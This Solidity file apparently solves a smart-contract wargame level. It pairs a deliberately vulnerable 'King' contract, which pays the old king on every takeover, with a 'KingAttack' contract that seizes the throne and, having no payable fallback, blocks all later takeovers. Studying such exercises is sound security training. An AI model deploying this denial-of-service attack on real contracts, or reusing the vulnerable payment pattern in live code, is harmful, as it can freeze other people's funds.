pragma solidity ^0.4.24;


import './Ownable.sol';

contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}



contract KingAttack {

    King victim;

    constructor(address _victim) public payable {
        victim = King(_victim);
    }

    //the victim contract is vulnerable because if the current king is not able to
    // receive the transfer, the game brakes. in this case the attacking contract
    //doesn't include a payable fallback function
    function attack() external payable returns(bool success) {
        if (address (victim).call.value(msg.value)()) {
            return true;
        }
    }

}
